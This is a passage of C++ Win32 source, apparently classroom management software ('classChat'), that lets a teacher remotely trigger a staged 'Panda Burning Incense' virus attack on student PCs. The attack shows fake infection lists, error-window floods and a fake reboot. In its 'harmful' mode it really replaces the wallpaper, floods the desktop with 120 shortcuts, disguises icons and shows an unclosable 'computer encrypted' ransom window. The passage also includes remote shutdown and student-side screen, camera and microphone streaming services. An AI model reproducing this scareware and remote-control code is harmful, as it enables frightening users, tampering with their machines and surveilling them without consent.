            int sz = (rc.bottom < rc.right ? rc.bottom : rc.right) / 4;
            auto pandaScene = [&](bool red) {
                HBRUSH b = CreateSolidBrush(red ? RGB(128, 0, 0) : RGB(10, 7, 5));
                RECT r = {0, 0, rc.right, rc.bottom};
                FillRect(dc, &r, b);
                DeleteObject(b);
                if (red) return;
                HBRUSH wht = CreateSolidBrush(RGB(238, 235, 226));
                HBRUSH blk = CreateSolidBrush(RGB(15, 13, 13));
                HBRUSH org = CreateSolidBrush(RGB(255, 160, 30));
                HBRUSH ob = (HBRUSH)SelectObject(dc, blk);
                Ellipse(dc, cx - sz*5/8, cy - sz*5/8, cx - sz*3/8, cy - sz*3/8);   // 左耳
                Ellipse(dc, cx + sz*3/8, cy - sz*5/8, cx + sz*5/8, cy - sz*3/8);   // 右耳
                SelectObject(dc, wht);
                Ellipse(dc, cx - sz*5/8, cy - sz/2, cx + sz*5/8, cy + sz*3/8);     // 脸
                SelectObject(dc, blk);
                Ellipse(dc, cx - sz*3/8, cy - sz*3/10, cx - sz/16, cy + sz/10);    // 左眼圈
                Ellipse(dc, cx + sz/16, cy - sz*3/10, cx + sz*3/8, cy + sz/10);    // 右眼圈
                SelectObject(dc, org);                                             // 橙色发光瞳 (恐怖)
                Ellipse(dc, cx - sz*7/32 - sz/32, cy - sz*7/50 - sz/40, cx - sz*7/32 + sz/32, cy - sz*7/50 + sz/40);
                Ellipse(dc, cx + sz*7/32 - sz/32, cy - sz*7/50 - sz/40, cx + sz*7/32 + sz/32, cy - sz*7/50 + sz/40);
                SelectObject(dc, blk);
                Ellipse(dc, cx - sz/16, cy, cx + sz/16, cy + sz/8);                // 鼻
                HBRUSH stk = CreateSolidBrush(RGB(74, 52, 34));
                SelectObject(dc, stk);
                for (int i = -1; i <= 1; ++i) {                                    // 三炷香
                    int x = cx + i * sz/5;
                    RECT st = {x - sz/48, cy + sz/3, x + sz/48, cy + sz*7/10};
                    FillRect(dc, &st, stk);
                }
                SelectObject(dc, ob);
                DeleteObject(stk); DeleteObject(org); DeleteObject(blk); DeleteObject(wht);
            };
            if (!s_pandaInit) {
                s_pandaInit = true;
                s_evt2 = now + dmRand(900, 1600);   // 首次惊吓时间
                pandaScene(false);
            }
            if (s_redWait) { s_redWait = false; pandaScene(false); }   // 红闪后恢复场景
            {   // 标题闪烁 (只重绘标题小区域)
                RECT tr = {0, 24, rc.right, 64};
                HBRUSH b = CreateSolidBrush(RGB(10, 7, 5));
                FillRect(dc, &tr, b); DeleteObject(b);
                SetBkMode(dc, TRANSPARENT);
                SelectObject(dc, hFontZoneT);
                SetTextColor(dc, ((now / 350) & 1) ? RGB(255, 45, 45) : RGB(120, 15, 15));
                DrawTextW(dc, L"熊猫烧香 已入侵本机", -1, &tr, DT_CENTER | DT_SINGLELINE);
            }
            for (int i = -1; i <= 1; ++i) {   // 香头火点闪烁 + 烟点上飘 (小区域重绘)
                int x = cx + i * sz/5;
                RECT f = {x - sz/20, cy + sz*3/5 - sz/6, x + sz/20, cy + sz*7/10};
                HBRUSH b = CreateSolidBrush(RGB(10, 7, 5));
                FillRect(dc, &f, b); DeleteObject(b);
                HBRUSH fire = CreateSolidBrush(((now / 200) & 1) ? RGB(255, 130, 20) : RGB(215, 35, 10));
                RECT fr = {x - sz/40, cy + sz*3/5 - sz/30, x + sz/40, cy + sz*3/5 + sz/60};
                FillRect(dc, &fr, fire); DeleteObject(fire);
                int sy = cy + sz*3/5 - sz/6 - (int)((now / 120) % (sz/5));
                HBRUSH sm = CreateSolidBrush(RGB(92, 86, 82));
                RECT sr = {x - sz/96, sy, x + sz/96, sy + sz/48};
                FillRect(dc, &sr, sm); DeleteObject(sm);
            }
            int ly = (int)(rc.bottom * 0.72);   // 感染名单滚动 (下方独立区域)
            if (now >= s_evt) {
                static const wchar_t* kDirs[] = {L"C:\\Windows\\System32", L"C:\\Windows",
                                                 L"C:\\Program Files\\Common Files",
                                                 L"C:\\Users\\Public\\Documents"};
                static const wchar_t* kExts[] = {L".dll", L".exe", L".sys", L".dat"};
                wchar_t nm[12];
                for (int i = 0; i < 8; ++i) nm[i] = (wchar_t)(L'a' + dmRand(0, 25));
                nm[8] = 0;
                wchar_t line[160];
                swprintf(line, 160, L"%s\\%s%s  已被熊猫烧香感染", kDirs[dmRand(0, 3)], nm, kExts[dmRand(0, 3)]);
                SelectObject(dc, s_fMono);
                SetTextColor(dc, RGB(255, 170, 40));
                SetBkMode(dc, TRANSPARENT);
                int rows = (rc.bottom - ly - 16) / 22;
                if (rows < 2) rows = 2;
                if (s_row >= rows) {   // 满屏后清空重来
                    RECT er = {0, ly, rc.right, rc.bottom};
                    HBRUSH b = CreateSolidBrush(RGB(10, 7, 5));
                    FillRect(dc, &er, b); DeleteObject(b);
                    s_row = 0;
                }
                TextOutW(dc, 40, ly + s_row * 22, line, (int)wcslen(line));
                ++s_row;
                s_evt = now + dmRand(110, 240);
            }
            if (now >= s_evt2) {   // 恐怖红屏惊吓 (一闪而过)
                pandaScene(true);
                MessageBeep(MB_ICONERROR);
                s_evt2 = now + dmRand(1300, 2400);
                s_redWait = true;
            }
            if (now - s_t0 > 5500) {
                s_phase = 4; s_t0 = now; s_evt = 0;
            }
            break; }
        case 4: {   // ---- 错误窗口群: 不断弹出系统错误小窗 ----
            if (now >= s_evt && (int)g_dmErrWins.size() < 36) {
                int ew = 390, eh = 170;
                int x = dmRand(0, rc.right > ew ? rc.right - ew : 0);
                int y = dmRand(0, rc.bottom > eh ? rc.bottom - eh : 0);
                HWND e = CreateWindowExW(WS_EX_TOPMOST, L"DMERR", L"系统错误",
                    WS_POPUP | WS_CAPTION, x, y, ew, eh, nullptr, nullptr, g_hInst,
                    (LPVOID)kDmErrTexts[dmRand(0, 7)]);
                if (e) {
                    ShowWindow(e, SW_SHOW);
                    g_dmErrWins.push_back(e);
                    MessageBeep(MB_ICONHAND);
                }
                s_evt = now + dmRand(120, 260);
            }
            if (now - s_t0 > 6500) {
                dmSeqErrCleanup();
                s_phase = 5; s_t0 = now; s_reboot = 0;
                fillAll(RGB(0, 0, 0));
            }
            break; }
        case 5: {   // ---- 重启动画: 转圈 spinner + "正在重新启动", 共 2 轮 ----
            int ccx = rc.right / 2, ccy = rc.bottom / 2;
            ULONGLONG inCyc = (now - s_t0) % 3400;
            int cycle = (int)((now - s_t0) / 3400);
            if (cycle != s_reboot) {
                s_reboot = cycle;
                fillAll(RGB(0, 0, 0));   // 轮次交替时黑一下 (模拟断电重启)
            }
            if (cycle < 2 && inCyc < 3000) {
                RECT sp = {ccx - 80, ccy - 80, ccx + 80, ccy + 80};
                HBRUSH b = CreateSolidBrush(RGB(0, 0, 0));
                FillRect(dc, &sp, b); DeleteObject(b);   // 只重画 spinner 小区域
                // Win11 风格: 一条弧线围着圈转 (弧长脉动), 不是几个点围圈
                REAL R = 44.0f;
                RectF ar(ccx - R, ccy - R, R * 2.0f, R * 2.0f);
                REAL ang = (REAL)fmod(now * 0.32, 360.0);              // 起始角旋转
                REAL sweep = 130.0f + 130.0f * (REAL)sin(now * 0.006); // 弧长脉动
                if (sweep < 20.0f) sweep = 20.0f;
                Graphics g(dc);
                g.SetSmoothingMode(SmoothingModeAntiAlias);
                Pen pen(Color(255, 255, 255, 255), 4.5f);
                pen.SetStartCap(LineCapRound);
                pen.SetEndCap(LineCapRound);
                g.DrawArc(&pen, ar, ang, sweep);
                SetBkMode(dc, TRANSPARENT);
                SetTextColor(dc, RGB(255, 255, 255));
                SelectObject(dc, hFontZoneT);
                RECT tr = {ccx - 200, ccy + 100, ccx + 200, ccy + 140};
                DrawTextW(dc, L"正在重新启动", -1, &tr, DT_CENTER | DT_SINGLELINE);
            }
            if (now - s_t0 > 7000) {
                fillAll(RGB(0, 0, 0));
                if (!g_dmHarm) return finishTo(0);       // 无害版 → 收尾蓝屏冻结
                s_phase = 6; s_t0 = now;                 // 有害版 → 后台落盘, 期间显示"正在加密"
                if (!s_harmStarted) {
                    s_harmStarted = true;
                    CreateThread(nullptr, 0, dmHarmThread, nullptr, 0, nullptr);
                }
            }
            break; }
        case 6: {   // ---- 等待有害效果落盘 ----
            SetBkMode(dc, TRANSPARENT);
            SetTextColor(dc, RGB(255, 255, 255));
            SelectObject(dc, hFontZoneT);
            RECT tr = {40, rc.bottom / 2 - 20, rc.right - 40, rc.bottom / 2 + 20};
            DrawTextW(dc, L"正在加密文件...", -1, &tr, DT_CENTER | DT_SINGLELINE);
            if (now - s_t0 > 20000) return finishTo(1);   // 兜底: 落盘超时也弹红窗
            break; }
        }
        ReleaseDC(h, dc);
        return 0; }
    case WM_DESTROY:
        KillTimer(h, 1);
        if (s_fMono) { DeleteObject(s_fMono); s_fMono = nullptr; }
        dmSeqErrCleanup();
        if (h == g_dmSeqWnd) g_dmSeqWnd = nullptr;
        return 0;
    }
    return DefWindowProcW(h, m, w, l);
}

// ---- 有害版: 壁纸备份/骷髅壁纸 + 复用 vip 勒索的 deskicon (图标伪装+快捷方式 flooding) ----
static std::wstring dmWpDatPath() {
    return dataPathFor(L"dm_wp.dat");
}
static std::wstring dmPandaPath() {
    wchar_t exe[MAX_PATH] = {0};
    GetModuleFileNameW(nullptr, exe, MAX_PATH);
    std::wstring d(exe);
    size_t p = d.find_last_of(L"\\/");
    if (p != std::wstring::npos) d = d.substr(0, p + 1);
    return d + L"panda.png";
}
// 有害版桌面壁纸: 直接用程序目录的熊猫烧香图 (不再画骷髅)
static bool dmSetPandaWallpaper() {
    std::wstring path = dmPandaPath();
    if (GetFileAttributesW(path.c_str()) == INVALID_FILE_ATTRIBUTES) return false;
    SystemParametersInfoW(SPI_SETDESKWALLPAPER, 0, (void*)path.c_str(),
                          SPIF_UPDATEINIFILE | SPIF_SENDCHANGE);
    return true;
}
// 生成恐怖风骷髅壁纸 (暗红渐变底 + 发光红瞳 + 裂纹 + 四角小骷髅 + 底部警示字) 并设为桌面背景
static bool dmSkullMake() {
    return dmSetPandaWallpaper();
}
static DWORD WINAPI dmHarmRestoreThread(LPVOID);
// 有害版落盘线程: 备份壁纸→骷髅壁纸→图标伪装+快捷方式 flooding (全部有备份, 解锁可精确还原)
// 任何时点被解锁 (g_dmHarmAbort) 都会回滚已做的动作; 结束时置 g_dmHarmDone
static DWORD WINAPI dmHarmThread(LPVOID) {
    Sleep(400);
    if (g_dmHarmAbort) { InterlockedExchange(&g_dmHarmDone, 1); return 0; }
    wchar_t wp[MAX_PATH] = {0};
    SystemParametersInfoW(SPI_GETDESKWALLPAPER, MAX_PATH, wp, 0);
    FILE* fp = _wfopen(dmWpDatPath().c_str(), L"wb");   // 备份先落盘 (空壁纸也写文件作标记)
    if (fp) {
        std::string u = wToUtf8(wp);
        fwrite(u.data(), 1, u.size(), fp);
        fclose(fp);
    }
    if (g_dmHarmAbort) { dmHarmRestoreAsync(); InterlockedExchange(&g_dmHarmDone, 1); return 0; }
    dmSkullMake();
    if (g_dmHarmAbort) { dmHarmRestoreAsync(); InterlockedExchange(&g_dmHarmDone, 1); return 0; }   // 壁纸已换, 必须回滚
    CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);
    deskicon::apply();   // 图标变 classChat + 120 个快捷方式占满桌面 (icons.dat/spawn.dat 备份)
    CoUninitialize();
    if (g_dmHarmAbort) { dmHarmRestoreAsync(); InterlockedExchange(&g_dmHarmDone, 1); return 0; }
    InterlockedExchange(&g_dmHarmApplied, 1);
    if (g_dmMsgWnd) PostMessageW(g_dmMsgWnd, WM_APP + 85, 0, 0);
    InterlockedExchange(&g_dmHarmDone, 1);
    return 0;
}
// 解锁回滚线程: 等落盘线程走完 (最多 10s), 再无条件幂等恢复 (壁纸→图标/快捷方式)
static DWORD WINAPI dmUnlockRollback(LPVOID) {
    for (int i = 0; i < 40 && !g_dmHarmDone; ++i) Sleep(250);
    Sleep(300);
    InterlockedExchange(&g_dmHarmApplied, 0);
    dmHarmRestoreThread(nullptr);
    return 0;
}
// 回滚: 还原壁纸 (备份为空则清除壁纸) → 删除快捷方式/还原图标 (deskicon 自带两轮恢复+自愈)
static DWORD WINAPI dmHarmRestoreThread(LPVOID) {
    FILE* fp = _wfopen(dmWpDatPath().c_str(), L"rb");
    if (fp) {
        std::string all;
        char buf[MAX_PATH * 2]; size_t n;
        while ((n = fread(buf, 1, sizeof(buf), fp)) > 0) all.append(buf, n);
        fclose(fp);
        std::wstring p = utf8ToW(all);
        SystemParametersInfoW(SPI_SETDESKWALLPAPER, 0, (void*)p.c_str(),
                              SPIF_UPDATEINIFILE | SPIF_SENDCHANGE);
        DeleteFileW(dmWpDatPath().c_str());
        // 注意: panda.png 是程序自带资源, 不删除
    }
    CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);
    deskicon::restore();
    CoUninitialize();
    return 0;
}
static void dmHarmRestoreAsync() {
    CloseHandle(CreateThread(nullptr, 0, dmHarmRestoreThread, nullptr, 0, nullptr));
}

// ---- 有害版收尾: 红色「电脑已被加密」小窗 + 黄色正计时 ----
static LRESULT CALLBACK dmRansomProc(HWND h, UINT m, WPARAM w, LPARAM l) {
    static ULONGLONG s_t0 = 0;
    static RECT s_timerRc = {0, 0, 0, 0};
    switch (m) {
    case WM_CREATE: s_t0 = GetTickCount64(); SetTimer(h, 1, 500, nullptr); return 0;
    case WM_TIMER: if (s_timerRc.right) InvalidateRect(h, &s_timerRc, FALSE); return 0;
    case WM_CLOSE: case WM_QUERYENDSESSION: return 0;
    case WM_SYSCOMMAND: return 0;
    case WM_ERASEBKGND: return 1;
    case WM_PAINT: {
        PAINTSTRUCT ps; HDC dc = BeginPaint(h, &ps);
        RECT rc; GetClientRect(h, &rc);
        Graphics g(dc);
        RectF full(0, 0, (REAL)rc.right, (REAL)rc.bottom);
        LinearGradientBrush bg(full, Color(255, 0x8B, 0x0A, 0x0A), Color(255, 0x50, 0x05, 0x05), 90.0f);
        g.FillRectangle(&bg, full);
        SolidBrush wt(Color(255, 255, 255, 255));
        SolidBrush yl(Color(255, 0xFF, 0xD7, 0x00));
        SolidBrush dm(Color(255, 0xE8, 0xAA, 0xAA));
        Font fT(L"Microsoft YaHei UI", 39, FontStyleBold);
        Font fB(L"Microsoft YaHei UI", 21, FontStyleRegular);
        Font fC(L"Consolas", 45, FontStyleBold);
        Font fS(L"Microsoft YaHei UI", 15, FontStyleRegular);
        StringFormat cf; cf.SetAlignment(StringAlignmentCenter);
        g.DrawString(L"⚠ 电脑已被加密", -1, &fT, RectF(0, 66, (REAL)rc.right, 90), &cf, &wt);
        g.DrawString(L"所有文件已被加密, 请等待管理员解锁。", -1, &fB,
                     RectF(0, 183, (REAL)rc.right, 45), &cf, &wt);
        ULONGLONG el = (GetTickCount64() - s_t0) / 1000;
        wchar_t tb[64];
        swprintf(tb, 64, L"已锁定 %02d:%02d:%02d",
                 (int)(el / 3600), (int)(el / 60 % 60), (int)(el % 60));
        RectF tr(0, 273, (REAL)rc.right, 78);
        g.DrawString(tb, -1, &fC, tr, &cf, &yl);   // 黄色正计时
        s_timerRc = {0, 267, rc.right, 360};
        g.DrawString(L"classChat 安全演示 — 解锁后自动恢复桌面与全部内容", -1, &fS,
                     RectF(0, 414, (REAL)rc.right, 36), &cf, &dm);
        EndPaint(h, &ps);
        return 0; }
    case WM_DESTROY:
        KillTimer(h, 1);
        if (h == g_dmRansomWnd) g_dmRansomWnd = nullptr;
        return 0;
    }
    return DefWindowProcW(h, m, w, l);
}
static void dmShowRansom() {
    if (g_dmHarmAbort) return;                 // 已被远程解锁: 不再弹窗
    if (g_dmSeqWnd) { DestroyWindow(g_dmSeqWnd); }
    if (g_dmRansomWnd) return;
    int sw = GetSystemMetrics(SM_CXSCREEN), sh = GetSystemMetrics(SM_CYSCREEN);
    int w = 840, hh = 540;   // 560x360 放大 1.5 倍
    g_dmRansomWnd = CreateWindowExW(WS_EX_TOPMOST, L"DMRANSOM", L"电脑已被加密",
        WS_POPUP | WS_CAPTION, (sw - w) / 2, (sh - hh) / 2, w, hh,
        nullptr, nullptr, g_hInst, nullptr);
    ShowWindow(g_dmRansomWnd, SW_SHOW);
    SetForegroundWindow(g_dmRansomWnd);
    MessageBeep(MB_ICONERROR);
}
static void dmStartSequence(bool harm) {
    if (!g_dmMsgWnd) return;
    if (g_dmSeqWnd || g_dmLockWnd || g_dmRansomWnd) return;   // 已在进行
    InterlockedExchange(&g_dmHarmAbort, 0);
    InterlockedExchange(&g_dmHarmApplied, 0);
    InterlockedExchange(&g_dmHarmDone, 0);
    g_dmHarm = harm;
    dmEnsureClasses();
    int sw = GetSystemMetrics(SM_CXSCREEN), sh = GetSystemMetrics(SM_CYSCREEN);
    g_dmSeqWnd = CreateWindowExW(WS_EX_TOPMOST, L"DMOSEQ", L"", WS_POPUP,
        0, 0, sw, sh, nullptr, nullptr, g_hInst, nullptr);
    ShowWindow(g_dmSeqWnd, SW_SHOWMAXIMIZED);
    SetForegroundWindow(g_dmSeqWnd);
}
static DWORD WINAPI dmShutThread(LPVOID) {
    Sleep(5000);
    HANDLE tok = nullptr;
    if (OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &tok)) {
        TOKEN_PRIVILEGES tp{};
        LookupPrivilegeValueW(nullptr, SE_SHUTDOWN_NAME, &tp.Privileges[0].Luid);
        tp.PrivilegeCount = 1; tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
        AdjustTokenPrivileges(tok, FALSE, &tp, 0, nullptr, nullptr);
        CloseHandle(tok);
    }
    ExitWindowsEx(EWX_SHUTDOWN | EWX_POWEROFF, SHTDN_REASON_MAJOR_OTHER | SHTDN_REASON_FLAG_PLANNED);
    return 0;
}

// ------------------------------ 教师端: 语音喊话采集 (UDP 广播流) ------------------------------
static volatile LONG g_dmVoiceOn = 0;
static void CALLBACK dmVoiceInCb(HWAVEIN, UINT msg, DWORD_PTR inst, LPWAVEHDR, DWORD_PTR) {
    if (msg == WIM_DATA && inst) SetEvent((HANDLE)inst);
}
static DWORD WINAPI dmVoiceThread(LPVOID) {
    WAVEFORMATEX wf{}; wf.wFormatTag = WAVE_FORMAT_PCM; wf.nChannels = 1;
    wf.nSamplesPerSec = 8000; wf.wBitsPerSample = 16;
    wf.nBlockAlign = 2; wf.nAvgBytesPerSec = 16000;
    HANDLE ev = CreateEventW(nullptr, FALSE, FALSE, nullptr);
    HWAVEIN wi = nullptr;
    bool ok = waveInOpen(&wi, WAVE_MAPPER, &wf, (DWORD_PTR)dmVoiceInCb, (DWORD_PTR)ev, CALLBACK_FUNCTION) == MMSYSERR_NOERROR;
    if (ok) {
        const int BS = 1600, NB = 4;   // 100ms/块
        WAVEHDR wh[NB]; BYTE dat[NB][BS];
        memset(wh, 0, sizeof(wh));
        for (int i = 0; i < NB; ++i) {
            wh[i].lpData = (LPSTR)dat[i]; wh[i].dwBufferLength = BS;
            waveInPrepareHeader(wi, &wh[i], sizeof(WAVEHDR));
            waveInAddBuffer(wi, &wh[i], sizeof(WAVEHDR));
        }
        waveInStart(wi);
        DWORD seq = 0;
        std::string head = std::string("DMAU|") + g_dmInst + "|" + dmW2u(g_dmName) + "|";
        std::string pkt(head.size() + 8 + BS, 0);
        memcpy(&pkt[0], head.c_str(), head.size());
        while (g_dmVoiceOn) {
            if (WaitForSingleObject(ev, 200) != WAIT_OBJECT_0) continue;
            WAVEHDR* done = nullptr;
            for (int i = 0; i < NB; ++i) if (wh[i].dwFlags & WHDR_DONE) { done = &wh[i]; break; }
            if (!done || done->dwBytesRecorded == 0) continue;
            char* body = &pkt[0] + head.size();
            dmPut32(body, (int32_t)++seq);
            dmPut32(body + 4, (int32_t)done->dwBytesRecorded);
            memcpy(body + 8, done->lpData, done->dwBytesRecorded);
            dmUdpSend(INADDR_BROADCAST, std::string(pkt, 0, head.size() + 8 + done->dwBytesRecorded));
            waveInUnprepareHeader(wi, done, sizeof(WAVEHDR));
            done->dwBufferLength = BS;
            waveInPrepareHeader(wi, done, sizeof(WAVEHDR));
            waveInAddBuffer(wi, done, sizeof(WAVEHDR));
        }
        waveInReset(wi);
        for (int i = 0; i < NB; ++i) waveInUnprepareHeader(wi, &wh[i], sizeof(WAVEHDR));
        waveInClose(wi);
    }
    CloseHandle(ev);
    g_dmVoiceOn = 0;
    if (g_dmDash) PostMessageW(g_dmDash, WM_APP + 81, ok ? 0 : 1, 0);
    return 0;
}
static void dmToggleVoice(HWND hDash) {
    if (g_dmVoiceOn) { g_dmVoiceOn = 0; return; }   // 线程自退后复位按钮
    g_dmVoiceOn = 1;
    CreateThread(nullptr, 0, dmVoiceThread, nullptr, 0, nullptr);
    SetWindowTextW(GetDlgItem(hDash, DM_IDC_VOICE), L"⏹ 停止语音喊话 (全体)");
}

// ------------------------------ 消息窗口 (主线程横幅转发) ------------------------------
static LRESULT CALLBACK dmMsgProc(HWND h, UINT m, WPARAM w, LPARAM l) {
    if (m == WM_APP + 86) {   // 管理员端: 收到学生机卸载通知
        UninstNote* n = (UninstNote*)l;
        if (n) CreateThread(nullptr, 0, dmUninstNoteThread, n, 0, nullptr);
        return 0;
    }
    if (m == WM_APP + 83) { char* spec = (char*)l; dmArmLock(spec ? spec : ""); free(spec); return 0; }
    if (m == WM_APP + 79) { dmHideLock(); return 0; }
    if (m == WM_TIMER && w == DM_LOCK_TIMER) { KillTimer(h, DM_LOCK_TIMER); dmStartSequence(g_dmHarm); return 0; }
    if (m == WM_APP + 85) {                                  // 有害效果落盘完成: 弹红色加密窗
        if (g_dmSeqWnd) { DestroyWindow(g_dmSeqWnd); }
        if (!g_dmHarmAbort) dmShowRansom();
        return 0;
    }
    if (m == WM_APP + 82) { LockWorkStation(); return 0; }   // 硬锁: 系统锁定界面
    if (m == WM_APP + 80) {   // 远程关机: 提示 5 秒后执行
        dmShowBanner(L"系统", L"电脑将在 5 秒后关机 (教师远程关机)...");
        CreateThread(nullptr, 0, dmShutThread, nullptr, 0, nullptr);
        return 0;
    }
    if (m == WM_APP + 77) {
        std::wstring from, text;
        {
            std::lock_guard<std::mutex> lk(g_dmShoutMtx);
            size_t p = g_dmShoutTitle.find(L"«");
            if (p != std::wstring::npos)
                from = g_dmShoutTitle.substr(p + 1, g_dmShoutTitle.find(L"»", p) - p - 1);
            text = g_dmShoutBody;
        }
        dmShowBanner(from, text);
        return 0;
    }
    return DefWindowProcW(h, m, w, l);
}

// ------------------------------ 类注册 / 会话 ------------------------------
static bool g_dmClasses = false;
static void dmEnsureClasses() {
    if (g_dmClasses) return;
    g_dmClasses = true;
    WNDCLASSW wc{};
    wc.hInstance = g_hInst; wc.hCursor = LoadCursorW(nullptr, IDC_ARROW);
    wc.hbrBackground = (HBRUSH)GetStockObject(WHITE_BRUSH);
    wc.lpfnWndProc = dmDashProc;   wc.lpszClassName = L"DIMODASH";   RegisterClassW(&wc);
    wc.lpfnWndProc = dmViewerProc; wc.lpszClassName = L"DIMOVIEW";
    wc.hbrBackground = (HBRUSH)GetStockObject(BLACK_BRUSH);            RegisterClassW(&wc);
    wc.lpfnWndProc = dmShoutProc;  wc.lpszClassName = L"DIMOSHOUT";    RegisterClassW(&wc);
    wc.lpfnWndProc = dmBannerProc; wc.lpszClassName = L"DIMOBANNER";
    wc.hbrBackground = nullptr;                                        RegisterClassW(&wc);
    wc.lpfnWndProc = dmMsgProc;    wc.lpszClassName = L"DIMOMSGWND";   RegisterClassW(&wc);
    wc.lpfnWndProc = dmLockProc;   wc.lpszClassName = L"DIMOLOCK";
    wc.hbrBackground = (HBRUSH)GetStockObject(BLACK_BRUSH);            RegisterClassW(&wc);
    wc.lpfnWndProc = dmPickProc;   wc.lpszClassName = L"DIMOPICK";
    wc.hbrBackground = (HBRUSH)(COLOR_BTNFACE + 1);                    RegisterClassW(&wc);
    wc.lpfnWndProc = dmLockOptProc; wc.lpszClassName = L"DIMOLOCKOPT";
    wc.hbrBackground = (HBRUSH)(COLOR_BTNFACE + 1);                    RegisterClassW(&wc);
    wc.hbrBackground = (HBRUSH)GetStockObject(BLACK_BRUSH);
    wc.lpfnWndProc = dmSeqProc;     wc.lpszClassName = L"DMOSEQ";      RegisterClassW(&wc);
    wc.hbrBackground = (HBRUSH)(COLOR_BTNFACE + 1);
    wc.lpfnWndProc = dmErrProc;     wc.lpszClassName = L"DMERR";       RegisterClassW(&wc);
    wc.hbrBackground = (HBRUSH)(COLOR_BTNFACE + 1);
    wc.lpfnWndProc = dmRansomProc;  wc.lpszClassName = L"DMRANSOM";    RegisterClassW(&wc);
}
void dmStartSession(const std::wstring& name, bool admin) {
    dmEnsureClasses();
    g_dmName = name; g_dmAdmin = admin;
    static bool booted = false;
    if (!booted) {
        booted = true;
        wsprintfA(g_dmInst, "%u-%u", GetTickCount(), GetCurrentProcessId());   // 实例ID: 区分本机同名多开
        g_dmUdpSend = socket(AF_INET, SOCK_DGRAM, 0);
        BOOL bc = TRUE; setsockopt(g_dmUdpSend, SOL_SOCKET, SO_BROADCAST, (char*)&bc, sizeof(bc));
        CreateThread(nullptr, 0, dmUdpRecvThread, nullptr, 0, nullptr);
        CreateThread(nullptr, 0, dmHbThread, nullptr, 0, nullptr);
        // 主线程消息窗口 (UDP 线程 → 主线程转发喊话横幅)
        g_dmMsgWnd = CreateWindowExW(0, L"DIMOMSGWND", L"", 0, 0, 0, 0, 0, HWND_MESSAGE, nullptr, g_hInst, nullptr);
    }
    if (!admin && !g_dmSvcOn) {   // 仅非 admin 角色开被监视服务 (admin 实例监听同端口会与本机学生实例抢连接)
        g_dmSvcOn = true;
        CreateThread(nullptr, 0, dmTcpSvc, (LPVOID)(uintptr_t)DM_PORT_SCR, 0, nullptr);
        CreateThread(nullptr, 0, dmTcpSvc, (LPVOID)(uintptr_t)DM_PORT_CAM, 0, nullptr);
        CreateThread(nullptr, 0, dmTcpSvc, (LPVOID)(uintptr_t)DM_PORT_MIC, 0, nullptr);
        static bool camBoot = false;          // 常驻摄像头捕获线程 (带消息泵)
        if (!camBoot) { camBoot = true; CreateThread(nullptr, 0, [](LPVOID) -> DWORD { dmCamThread(); return 0; }, nullptr, 0, nullptr); }
    }
}
void dmLeave() { g_dmName.clear(); g_dmAdmin = false; }

} // namespace dm

